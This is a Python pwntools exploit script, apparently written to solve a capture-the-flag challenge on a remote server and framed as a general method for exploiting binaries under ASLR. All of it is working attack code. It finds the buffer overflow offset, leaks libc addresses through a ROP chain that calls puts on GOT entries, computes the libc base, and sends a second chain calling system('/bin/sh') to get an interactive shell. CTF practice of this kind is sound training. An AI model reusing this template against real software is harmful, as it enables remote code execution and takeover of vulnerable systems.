from pwn import *
from struct import pack
import base64

##########################################################################
# My approach to Binary Exploitation on ASLR Enabled systems.
# DOWNLOAD PWNTOOLS TO RUN!
# TO FIND LIBC VERSION, use https://libc.blukat.me/
##########################################################################

nops = b'\x90'
padding = b'\x00'

def clean(x): return x.split('\n')[1:-2]

pad = lambda x: x + padding*(8-len(x))

##########################################################################
# Find Offset
##########################################################################

def getOffset(elf):
    r = elf.process()
    crash = cyclic(1024)
    r.clean()
    r.sendline(crash)
    r.wait()
    core = r.corefile
    rsp = core.rsp
    offset = core.read(rsp, 4)
    offset = cyclic_find(offset)
    success("Offset found @ {a} bytes".format(a=offset))
    return offset

##########################################################################
# First lets connect to the server and get the binary
##########################################################################

def fetchNewBinary():
    r = remote('challs.xmas.htsp.ro', 12002)
    r.readline()
    binary = base64.b64decode(r.readline()[11:-2])
    f = open('tmp', 'wb')
    f.write(binary)
    f.close()
    elf = ELF('./tmp')
    context.binary = './tmp'
    return elf, r

# Libc is found by first running it the exploit once to leak addresses, 
# tallying it with libc-database, then setting the correct libc destination
# address, then running the code again to PWN!

def exploit(elf, r, offset, libc):  
    rop = ROP(elf)
    poprdi = p64(rop.find_gadget(['pop rdi']).address)
    # elf.symbols contains addresses of functions (and stubs as here)
    putsret = p64(elf.symbols['puts'])
    printfret = p64(elf.symbols['printf'])
    getsret = p64(elf.symbols['gets'])
    # mainret = p64(elf.symbols['main'])
    # mainret = pad(elf.read(0x400650, 4))    # 0x400650 is constant address for all binaries containing address of main
    # print("Main Address", hex(u64(mainret)))
    mainret = p64(0x400630) # Address of entry function itself!
    exitret = p64(elf.symbols['exit'])
    putsgot = p64(elf.got['puts'])
    getsgot = p64(elf.got['gets'])
    ##########################################################################
    # FIRST WE LEAK THE LIBC ADDRESS!
    ##########################################################################
    # Generating Payload-->
    crashOffset = offset
    junk = nops*(crashOffset)
    payload = b''.join([junk,
                poprdi, putsgot, putsret,
                poprdi, getsgot, putsret,
                mainret,
                exitret])
    r.clean()
    r.sendline(payload)
    r.readline()    # Discard trash lines
    r.readline()
    # Calculate leaked addresses-->
    puts_leak = u64(pad(r.readline())) & 0x0ffffffffffff
    gets_leak = u64(pad(r.readline())) & 0x0ffffffffffff
    print("puts: ", hex(puts_leak))
    print("gets: ", hex(gets_leak))
    puts_offset = libc.symbols['puts']
    libc_base = puts_leak - puts_offset
    # This address must be 0x1000 aligned, if not, its Probably wrong!
    print("libc base: ", hex(libc_base))
    if(libc_base & 0x0000000000000fff):
        print("ALERT! Program is probably using different libc than specified!")
    ##########################################################################
    # Then we exploit!
    ##########################################################################
    binsh = p64(libc_base+next(libc.search(b'/bin/sh'))) #Verify with find /bin/sh
    system = p64(libc_base+libc.sym["system"])
    # one_gadget = p64(0x4f2c5 + libc_base)  # from one_gadget
    npayload = b''.join([junk,
                        poprdi, binsh, system, 
                        poprdi, binsh, system,
                        poprdi, binsh, system,  # Multiple times just to make sure!
                        mainret])
    r.clean()
    r.sendline(npayload)
    r.clean()
    r.interactive()

elf, r = fetchNewBinary()
# r = elf.process()
offset = getOffset(elf)
print(offset)
print("Attempting to pwn==>")
# Libc found by running the code once just to get the offsets, then matching it in libc-database
libc = ELF(
    "/home/ashishkumarsingh/HackingTools/libc-database/db/libc6_2.27-3ubuntu1_amd64.so")
    # ("/lib/x86_64-linux-gnu/libc-2.30.so")    # My libc for local testing
exploit(elf, r, offset, libc)